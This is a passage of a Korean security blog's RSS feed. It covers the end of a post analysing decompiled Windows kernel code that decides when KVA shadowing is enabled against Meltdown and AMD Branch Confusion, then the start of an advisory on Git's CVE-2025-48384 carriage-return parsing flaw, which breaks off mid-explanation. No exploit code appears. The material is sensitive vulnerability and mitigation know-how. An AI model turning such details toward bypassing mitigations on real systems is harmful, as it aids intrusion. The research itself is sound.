result2, <span class="hljs-keyword">char</span> *__zero)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">int</span> CpuModel_1; <span class="hljs-comment">// r14d</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor; <span class="hljs-comment">// al</span>  <span class="hljs-keyword">char</span> CpuType_Family; <span class="hljs-comment">// r12</span>  <span class="hljs-keyword">bool</span> IsAnyHypervisorPresent; <span class="hljs-comment">// r9</span>  <span class="hljs-keyword">char</span> CpuVendor_2; <span class="hljs-comment">// bl</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> ProcessorFlags; <span class="hljs-comment">// ecx</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuModel; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuStepping; <span class="hljs-comment">// al</span><span class="hljs-comment">//...</span>  <span class="hljs-keyword">char</span> *result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int8 CpuVendor_1; <span class="hljs-comment">// [rsp+20h] [rbp-60h]</span>      CpuVendor = PRCB-&gt;CpuVendor;  CpuType_Family = PRCB-&gt;CpuType_Family;  LOBYTE(CpuModel_1) = PRCB-&gt;CpuModel;<span class="hljs-comment">//...</span>  CpuVendor_1 = CpuVendor;  v48 = <span class="hljs-number">1</span>;    <span class="hljs-comment">// Hypervisor check</span>  <span class="hljs-keyword">if</span> ( HviIsHypervisorMicrosoftCompatible() )  {    HviGetEnlightenmentInformation(&amp;v54);    v53 = <span class="hljs-number">0</span>i64;    HviGetHypervisorFeatures(&amp;v53);    <span class="hljs-keyword">if</span> ( (v53 &amp; <span class="hljs-number">0x100000000000</span>i64) == <span class="hljs-number">0</span> || (v54 &amp; <span class="hljs-number">0x1000</span>) != <span class="hljs-number">0</span> )    {      IsAnyHypervisorPresent = <span class="hljs-number">1</span>;    }    <span class="hljs-keyword">else</span>    {      IsAnyHypervisorPresent = <span class="hljs-number">0</span>;      v48 = <span class="hljs-number">0</span>;    }  }  <span class="hljs-keyword">else</span>  {    IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();    v48 = IsAnyHypervisorPresent;  }  v11 = result1;  <span class="hljs-keyword">if</span> ( KiIsBranchConfusionPresent(PRCB) )  {    v11 |= <span class="hljs-number">0x8000</span>ui64;    *&amp;result1 = v11;  }<span class="hljs-comment">//...</span>  *result2 = result1;  *(result2 + <span class="hljs-number">16</span>) = <span class="hljs-number">4</span>i64;  result = __zero;  <span class="hljs-keyword">if</span> ( __zero )    *__zero = v8;  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xD574;&#xB2F9; &#xD568;&#xC218;&#xC5D0;&#xB294; &#xB2E4;&#xC591;&#xD55C; &#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAE30;&#xBC18; side-channel &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC788;&#xC9C0;&#xB9CC;, &#xCF54;&#xB4DC;&#xB97C; &#xB2E4; &#xC4F0;&#xAE30;&#xC5D0;&#xB294; &#xB108;&#xBB34; &#xAE30;&#xB2C8;&#xAE4C; KVAS &#xD65C;&#xC131;&#xD654;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; <code>0x8000</code> &#xBE44;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB9CC; &#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>&#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAD00;&#xB828; &#xCDE8;&#xC57D;&#xC810; &#xBAA9;&#xB85D;&#xC740; <a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">MS &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xB4DC; &#xAC00;&#xC774;&#xB358;&#xC2A4;</a> &#xCC38;&#xACE0;</li></ul><p><code>KiIsBranchConfusionPresent</code> &#xD568;&#xC218; &#xBC18;&#xD658;&#xAC12;&#xC774; True&#xBA74; <code>0x8000</code> &#xBE44;&#xD2B8;&#xB97C; &#xC124;&#xC815;&#xD558;&#xB124;&#xC694;.</p><p><code>KiIsBranchConfusionPresent</code></p><pre><code class="hljs jsx">__int64 __fastcall KiIsBranchConfusionPresent(_KPRCB *a1){  bool IsAnyHypervisorPresent; <span class="hljs-comment">// al</span>  unsigned int v3; <span class="hljs-comment">// edx</span>  <span class="hljs-keyword">if</span> ( a1-&gt;CpuVendor != <span class="hljs-number">1</span> || (KeFeatureBits2 &amp; <span class="hljs-number">0x1000000</span>) != <span class="hljs-number">0</span> )    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>i64;  IsAnyHypervisorPresent = HviIsAnyHypervisorPresent();  v3 = <span class="hljs-number">0</span>;  <span class="hljs-keyword">if</span> ( IsAnyHypervisorPresent )    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;  LOBYTE(v3) = a1-&gt;CpuType_Family != <span class="hljs-number">25</span>;  <span class="hljs-keyword">return</span> v3;}</code></pre><p>&#xD568;&#xC218; &#xB85C;&#xC9C1;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>CpuVendor&#xAC00; AMD&#xAC00; &#xC544;&#xB2C8;&#xBA74; False &#xBC18;&#xD658;<ul><li>Branch Confusion&#xC740; AMD CPU&#xC5D0;&#xB9CC; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xCDE8;&#xC57D;&#xC810;(<a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">CVE-2022-23825</a>)</li></ul></li><li><code>HviIsAnyHypervisorPresent</code>&#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; Hypervisor&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; True &#xBC18;&#xD658;<ul><li>CVE-2022-23825&#xB294; &#xAC00;&#xC0C1;&#xD654; &#xD658;&#xACBD;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xC8FC;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xBBC0;&#xB85C; Hyperviosr&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB41C; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; KVAS&#xB97C; &#xD65C;&#xC131;&#xD654;&#xD558;&#xB3C4;&#xB85D; &#xAD6C;&#xD604;&#xB428;</li></ul></li><li>Family Number&#xAC00; Zen 3 / Zen 3+ / Zen 4 &#xC778; 25 &#xC778; &#xACBD;&#xC6B0;&#xC5D0;&#xB9CC; True &#xBC18;&#xD658;<ul><li>&#xADF8; &#xC678; &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB294; &#xC601;&#xD5A5;&#xBC1B;&#xC9C0; &#xC54A;&#xC74C;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC74C;</li></ul></li></ol><p>&#xC774;&#xD6C4; <code>KiEnableKvaShadowing</code> &#xC5D0;&#xC11C; KVAS &#xD65C;&#xC131;&#xD654; &#xC804; &#xB9C8;&#xC9C0;&#xB9C9; &#xAC80;&#xC0AC;&#xAC00; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">KiEnableKvaShadowing</span><span class="hljs-params">(_KPRCB *a1)</span></span><span class="hljs-function"></span>{  __int64 v2; <span class="hljs-comment">// rdx</span>  __int64 v3; <span class="hljs-comment">// rcx</span>  <span class="hljs-keyword">char</span> v4; <span class="hljs-comment">// cl</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// rax</span>  __int64 v6; <span class="hljs-comment">// rdx</span>  __int64 v7; <span class="hljs-comment">// r11</span>  <span class="hljs-keyword">unsigned</span> __int8 v8; <span class="hljs-comment">// cf</span>  <span class="hljs-keyword">unsigned</span> __int64 v9; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int64 v10; <span class="hljs-comment">// rax</span>  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> __int16 v12; <span class="hljs-comment">// cx</span>  <span class="hljs-keyword">if</span> ( KiIsKvaShadowDisabled() )  {    KiIsKvaShadowConfigDisabled = <span class="hljs-number">1</span>;  }  <span class="hljs-keyword">else</span>  {    <span class="hljs-keyword">if</span> ( (KeFeatureBits2 &amp; <span class="hljs-number">0x18000</span>) == <span class="hljs-number">0x8000</span> )      *(_QWORD *)(v3 + <span class="hljs-number">11520</span>) = <span class="hljs-number">3</span>i64;    v4 = KiKernelCetEnabled;    <span class="hljs-keyword">if</span> ( !(_BYTE)KiKernelCetEnabled &amp;&amp; (<span class="hljs-keyword">unsigned</span> __int8)KiIsKvaLeakSimulated() )      KiKvaLeakageSimulate = <span class="hljs-number">1</span>;        <span class="hljs-comment">// Enable KVAS</span>    <span class="hljs-keyword">if</span> ( KiKvaLeakage || KiKvaLeakageSimulate )    {      <span class="hljs-keyword">if</span> ( v4 )        KeBugCheckEx(<span class="hljs-number">0x5D</span>u, <span class="hljs-number">0x4B766120</span>ui64, <span class="hljs-number">0x4B434554</span>ui64, <span class="hljs-number">0</span>i64, <span class="hljs-number">0</span>i64);      v5 = __readcr3();      a1-&gt;KernelDirectoryTableBase = v5;      *(_QWORD *)(v2 + <span class="hljs-number">4216</span>) = *(_QWORD *)(v2 + <span class="hljs-number">4100</span>);      KiInitializeDescriptorIst(a1);      *(_QWORD *)(v7 + <span class="hljs-number">4100</span>) = v7 + <span class="hljs-number">16896</span>;      <span class="hljs-keyword">if</span> ( a1-&gt;Number )      {        result = KiShadowProcessorAllocation(a1, v7);        <span class="hljs-keyword">if</span> ( !(_DWORD)result )          <span class="hljs-keyword">return</span> result;        v12 = *(_WORD *)(KeGetPrcb(<span class="hljs-number">0</span>i64) + <span class="hljs-number">44714</span>);        a1-&gt;ShadowFlags |= <span class="hljs-number">2u</span>;        a1-&gt;VerwSelector = v12;      }      <span class="hljs-keyword">else</span>      {        LOBYTE(v6) = <span class="hljs-number">1</span>;        KiInitializeIdt(v7, v6);        KeGetCurrentThread()-&gt;ApcState.Process-&gt;AddressPolicy = <span class="hljs-number">1</span>;        byte_140FCE0E0 = <span class="hljs-number">1</span>;        _InterlockedOr(dword_140FCE57C, <span class="hljs-number">0x4000</span>u);        KiSetAddressPolicy(<span class="hljs-number">1</span>i64);        v8 = _bittest64((<span class="hljs-keyword">const</span> <span class="hljs-keyword">signed</span> __int64 *)&amp;a1-&gt;FeatureBits, <span class="hljs-number">0x2A</span>u);        a1-&gt;VerwSelector = <span class="hljs-number">24</span>;        <span class="hljs-keyword">if</span> ( v8 )        {          v9 = __readcr4();          __writecr4(v9 &amp; <span class="hljs-number">0xFFFFFFFFFFFDFF7F</span>ui64 | <span class="hljs-number">0x20000</span>);          v10 = __readcr3();          __writecr3(v10 | <span class="hljs-number">2</span>);          KiFlushPcid |= <span class="hljs-number">1u</span>;        }        <span class="hljs-keyword">if</span> ( (a1-&gt;FeatureBits &amp; <span class="hljs-number">0x240000000000</span>i64) == <span class="hljs-number">0x240000000000</span>i64 )          KiFlushPcid |= <span class="hljs-number">2u</span>;        HvlRescindEnlightenments();        KiKvaShadow = <span class="hljs-number">1</span>;        KiKvaShadowMode = <span class="hljs-number">2</span> - (KiFlushPcid != <span class="hljs-number">0</span>);      }      <span class="hljs-keyword">if</span> ( KiFlushPcid )        _interlockedbittestandset64((<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">signed</span> __int32 *)&amp;a1-&gt;KernelDirectoryTableBase, <span class="hljs-number">0x3F</span>ui64);    }  }  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>i64;}</code></pre><ul><li><code>if ( KiKvaLeakage || KiKvaLeakageSimulate )</code>  &#xBD84;&#xAE30;<ul><li><code>KiDetectKvaLeakage</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC124;&#xC815;&#xD55C; &#xC804;&#xC5ED;&#xBCC0;&#xC218;<code>KiKvaLeakage</code></li><li>&#xC218;&#xB3D9; &#xC124;&#xC815;&#xAC12;(&#xB514;&#xBC84;&#xAE45; &#xBC0F; &#xD14C;&#xC2A4;&#xD2B8;&#xC6A9;)&#xC744; &#xD1B5;&#xD574; &#xACB0;&#xC815;&#xB418;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xB418;&#xB294; &#xC804;&#xC5ED;&#xBCC0;&#xC218; <code>KiKvaLeakageSimulate</code></li></ul></li><li>&#xB450; &#xC804;&#xC5ED;&#xBCC0;&#xC218; &#xAC12; &#xC911; &#xD558;&#xB098;&#xB77C;&#xB3C4; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBA74; KVAS&#xB97C; &#xD65C;&#xC131;&#xD654;</li></ul><h1 id="&#xC138;&#xC904;&#xC694;&#xC57D;"><a href="#&#xC138;&#xC904;&#xC694;&#xC57D;" class="headerlink" title="&#xC138;&#xC904;&#xC694;&#xC57D;"></a>&#xC138;&#xC904;&#xC694;&#xC57D;</h1><ul><li>Windows Kernel&#xC740; &#xCD08;&#xAE30;&#xD654; &#xC2DC; CPU&#xC5D0; &#xB530;&#xB77C; KVAS(&#xBC0F; &#xB2E4;&#xB978; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158;)&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD65C;&#xC131;&#xD654;&#xD568;.</li><li>KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD558;&#xB294; &#xAE30;&#xC900;&#xC740; &#xD06C;&#xAC8C; &#xB450; &#xAC00;&#xC9C0;<ul><li>Intel: Rogue Data Cache Load(Meltdown)</li><li>AMD: Branch Confusion</li></ul></li><li>CPU&#xAC00; MSR&#xC744; &#xD1B5;&#xD574; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC801;&#xC6A9; &#xC5EC;&#xBD80;&#xB97C; &#xD655;&#xC778;&#xD558;&#xACE0;, MSR &#xAE30;&#xB2A5;&#xC774; &#xC5C6;&#xC73C;&#xBA74; &#xB808;&#xAC70;&#xC2DC; &#xCCB4;&#xD06C; (bitmask, &#xBAA8;&#xB378;&#xB118;&#xBC84; &#xC815;&#xBCF4; &#xB4F1;)&#xB97C; &#xD1B5;&#xD574; KVAS &#xD65C;&#xC131;&#xD654; &#xC5EC;&#xBD80;&#xB97C; &#xACB0;&#xC815;&#xD568;.</li></ul><h1 id="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"><a href="#&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;" class="headerlink" title="&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;"></a>&#xB9C8;&#xBB34;&#xB9AC;&#xD558;&#xBA70;</h1><p><img src="/2025/08/10/l0ch/deep-dive-into-kva/ko/image1.jpg" alt="Untitled"></p><p>&#xC0AC;&#xC2E4; &#xC608;&#xC804;&#xC5D0; &#xD55C;&#xCC3D; &#xCD94;&#xCE21; &#xC2E4;&#xD589; &#xAE30;&#xBC18;&#xC758; &#xC0AC;&#xC774;&#xB4DC;&#xCC44;&#xB110; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC774;&#xC288;&#xB420; &#xB54C; &#xAD6D;&#xBC29;&#xC758; &#xC758;&#xBB34;&#xB97C; &#xC218;&#xD589;&#xD558;&#xB290;&#xB77C; &#xC81C;&#xB300;&#xB85C; &#xD30C;&#xBCF4;&#xC9C8; &#xBABB;&#xD588;&#xB294;&#xB370;&#xC694;, &#xC800;&#xBC88; KASLR bypass&#xC640; &#xC774;&#xBC88; &#xAE00;&#xC744; &#xC791;&#xC131;&#xD558;&#xBA74;&#xC11C; &#xC790;&#xC138;&#xD788; &#xD30C;&#xBCFC; &#xAE30;&#xD68C;&#xAC00; &#xB41C; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. &#xACFC;&#xAC70;&#xC758; &#xC774;&#xC288;&#xB97C; &#xC81C;&#xB300;&#xB85C; &#xD30C;&#xC545;&#xD558;&#xB294; &#xAC8C; &#xD604;&#xC7AC;&#xC758; &#xD2B8;&#xB80C;&#xB4DC;&#xB97C; &#xB530;&#xB77C;&#xAC00;&#xB294; &#xAC83; &#xB9CC;&#xD07C;&#xC774;&#xB098; &#xC911;&#xC694;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xB2E4;&#xC2DC; &#xD55C; &#xBC88; &#xB290;&#xB07C;&#xBA74;&#xC11C;,  <del>&#xC774;&#xC81C; Windows Internals &#xC644;&#xB3C5;&#xC744; &#xB2E4;&#xC2DC; &#xC2DC;&#xB3C4;&#xD558;&#xB294; &#xAC78;&#xB85C;..</del></p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB3C4; &#xC7AC;&#xBC0C;&#xB294; &#xC5F0;&#xAD6C; &#xC8FC;&#xC81C; &#xB4E4;&#xACE0; &#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;~</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11">https://support.microsoft.com/en-us/topic/kb4073119-windows-client-guidance-for-it-pros-to-protect-against-silicon-based-microarchitectural-and-speculative-execution-side-channel-vulnerabilities-35820a8a-ae13-1299-88cc-357f104f5b11</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23825</a></p><p><a href="https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html">https://www.intel.com/content/www/us/en/developer/articles/technical/software-security-guidance/technical-documentation/cpuid-enumeration-and-architectural-msrs.html</a></p><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm">https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/ntos/amd64_x/cpu_vendors.htm</a></p><p><a href="https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04">https://support.microsoft.com/en-us/topic/kb4074629-understanding-speculationcontrol-powershell-script-output-fd70a80a-a63f-e539-cda5-5be4c9e67c04</a></p><p><a href="https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html">https://www.intel.com/content/www/us/en/content-details/782158/intel-64-and-ia-32-architectures-software-developer-s-manual-combined-volumes-1-2a-2b-2c-2d-3a-3b-3c-3d-and-4.html</a></p><p><a href="https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB">https://www.vergiliusproject.com/kernels/x64/windows-11/24h2/_KPRCB</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/exploit-techniques/">exploit techniques</category>
      
      <category domain="https://hackyboiz.github.io/tags/KVAS/">KVAS</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/10/l0ch/deep-dive-into-kva/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-48384: Git CLI의 임의 파일 쓰기 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/09/bekim/2025-08-09/</link>
      <guid>https://hackyboiz.github.io/2025/08/09/bekim/2025-08-09/</guid>
      <pubDate>Sat, 09 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2025-48384&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-48384">https://nvd.nist.gov/vuln/detail/CVE-2025-48384</a></li><li><a href="https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384">https://dgl.cx/2025/07/git-clone-submodule-cve-2025-48384</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p><strong>Git CLI(macOS &#xBC0F; Linux)</strong> </p><ul><li>Git &#x2264; 2.43.6</li><li>2.44.0 &#x2264; Git &#x2264; 2.44.3</li><li>2.45.0 &#x2264; Git &#x2264; 2.45.3</li><li>2.46.0 &#x2264; Git &#x2264; 2.46.3</li><li>2.47.0 &#x2264; Git &#x2264; 2.47.2</li><li>2.48.0 &#x2264; Git &#x2264; 2.48.1</li><li>2.49.0, 2.50.0</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Git&#xC740; &#xD558;&#xB098;&#xC758; &#xC800;&#xC7A5;&#xC18C; &#xC548;&#xC5D0; &#xB2E4;&#xB978; Git &#xC800;&#xC7A5;&#xC18C;&#xB97C; &#xD3EC;&#xD568;&#xD558;&#xB294; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8;(submodule) &#xAE30;&#xB2A5;&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xAE30;&#xB2A5;&#xC740; &#xBCF4;&#xD1B5; &#xC678;&#xBD80; &#xB77C;&#xC774;&#xBE0C;&#xB7EC;&#xB9AC;&#xB098; &#xACF5;&#xD1B5; &#xCF54;&#xB4DC;&#xB97C; &#xBCC4;&#xB3C4;&#xB85C; &#xAD00;&#xB9AC;&#xD560; &#xB54C; &#xC0AC;&#xC6A9;&#xB418;&#xBA70;, &#xC774; &#xB54C; Git&#xC740; &#xC11C;&#xBE0C;&#xBAA8;&#xB4C8;&#xC758; &#xACBD;&#xB85C;(path), &#xC6D0;&#xACA9; &#xC800;&#xC7A5;&#xC18C; &#xC8FC;&#xC18C;(url) &#xB4F1;&#xC758; &#xC815;&#xBCF4;&#xB97C; .gitmodules &#xD30C;&#xC77C;&#xC5D0; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xD30C;&#xC77C;&#xC740; &#xC800;&#xC7A5;&#xC18C;&#xC5D0; &#xCEE4;&#xBC0B;&#xB418;&#xC5B4; &#xD568;&#xAED8; &#xC804;&#xD30C;&#xB418;&#xBA70;, Git&#xC740; &#xC774;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xD558;&#xC704; &#xBAA8;&#xB4C8;&#xC744; &#xD074;&#xB860;&#xD558;&#xAC70;&#xB098; &#xCD08;&#xAE30;&#xD654;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774; <code>.gitmodules</code>  &#xD30C;&#xC77C;&#xC740; .ini &#xC2A4;&#xD0C0;&#xC77C;&#xC758; &#xAD6C;&#xBB38;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs ini"><span class="hljs-section">[section]</span>    <span class="hljs-attr">key</span> = value</code></pre><p>&#xADF8;&#xB9AC;&#xACE0; Git&#xC740; DOS &#xC2A4;&#xD0C0;&#xC77C; &#xC904;&#xBC14;&#xAFC8; &#xBC29;&#xC2DD;&#xC778; CR+LF (Carriage Return + Line Feed)&#xC744; &#xC9C0;&#xC6D0;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>CR(Carriage Return): <code>\r</code>, &#xCEE4;&#xC11C;&#xB97C; &#xD604;&#xC7AC; &#xC904;&#xC758; &#xB9E8; &#xC55E;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li><li>LF(Line Feed): <code>\n</code>, &#xCEE4;&#xC11C;&#xB97C; &#xB2E4;&#xC74C; &#xC904;&#xB85C; &#xC774;&#xB3D9;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;</li></ul><p>Git&#xC774; &#xAD6C;&#xC131; &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C;&#xB294; <code>\r</code> &#xBB38;&#xC790;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC788;&#xC73C;&#xBA70;, &#xC774; &#xCF54;&#xB4DC;&#xB294; <code>config.c</code> &#xD30C;&#xC77C;&#xC758; <code>get_next_char()</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAD6C;&#xD604;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> <span class="hljs-title">get_next_char</span><span class="hljs-params">(struct config_source *cs)</span></span><span class="hljs-function"></span>{        <span class="hljs-keyword">int</span> c = cs-&gt;do_fgetc(cs);        <span class="hljs-keyword">if</span> (c == <span class="hljs-string">&apos;\r&apos;</span>) { <span class="hljs-comment">// [1]</span>                <span class="hljs-comment">/* DOS like systems */</span>                c = cs-&gt;do_fgetc(cs);                <span class="hljs-keyword">if</span> (c != <span class="hljs-string">&apos;\n&apos;</span>) { <span class="hljs-comment">//[2]</span>                        <span class="hljs-keyword">if</span> (c != EOF)                                cs-&gt;do_ungetc(c, cs);                        c = <span class="hljs-string">&apos;\r&apos;</span>;                }        }</code></pre><p>[1] &#xBB38;&#xC790;&#xC5D0; <code>\r</code>&#xC774; &#xC788;&#xC744; &#xB54C;, &#xB2E4;&#xC74C; &#xBB38;&#xC790;&#xAC00; <code>\n</code>&#xC774;&#xBA74; &#x2192; <code>\r</code>&#xC740; &#xC81C;&#xAC70;&#xB418;&#xACE0; <code>\n</code>&#xB9CC; &#xBC18;&#xD658;&#xB418;&#xC9C0;&#xB9CC;,<br>[2]<code>\r</code> &#xB2E4;&#xC74C; &#xBB38;&#xC790;&#xAC00; <code>\n</code>&#xC774; &#xC544;&#xB2C8;&#xBA74; &#x2192; <code>\r</code>&#xC740; &#xADF8;&#xB300;&#xB85C; &#xBC18;&#xD658;&#xB418;&#xACE0;, &#xB2E4;&#xC74C; &#xBB38;&#xC790;&#xB294; &#xB2E4;&#xC2DC; &#xB418;&#xB3CC;&#xB824;&#xC838; &#xB2E4;&#xC74C; &#xD638;&#xCD9C;&#xC5D0;&#xC11C; &#xB2E4;&#xC2DC; &#xC77D;&#xD788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4; <code>(ungetc)</code><br>&#xC774; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD;&#xC740; &#xC904; &#xB2E8;&#xC704;&#xB85C; &#xB3D9;&#xC791;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC904; &#xB05D;&#xC5D0; &#xB2E8;&#xB3C5;&#xC73C;&#xB85C; &#xC874;&#xC7AC;&#xD558;&#xB294; <code>\r</code>&#xC740; &#xD56D;&#xC0C1; &#xC81C;&#xAC70;&#xB429;&#xB2C8;&#xB2E4;. </p><p>&#xBB38;&#xC81C;&#xB294; Git&#xC774; <code>.gitmodules</code> &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C;&#xC640; &#xC4F8; &#xB54C;&#xC758; &#xCC98;&#xB9AC; &#xBC29;&#xC2DD;&#xC774; &#xB2E4;&#xB974;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. Git&#xC740; <code>.gitmidules</code> &#xD30C;&#xC77C;&#xC744; &#xC77D;&#xC744; &#xB54C; &#xC904; &#xB05D;&#xC5D0; &#xC788;&#xB294; <code>\r</code>&#xC744; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC81C;&#xAC70;&#xD558;&#xC9C0;&#xB9CC;, &#xB098;&#xC911;&#xC5D0; &#xC774; &#xAC12;&#xC744; &#xC124;&#xC815; &#xD30C;&#xC77C;&#xC5D0; &#xC4F8; &#xB54C;&#xB294; <code>\r</code>&#xC744; &#xC81C;&#xAC70;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xADF8;&#xB300;&#xB85C; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.<br>&#xC774;&#xB85C; &#xC778;&#xD574; Git &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; &#xCC98;&#xB9AC;&#xB418;&#xB294; 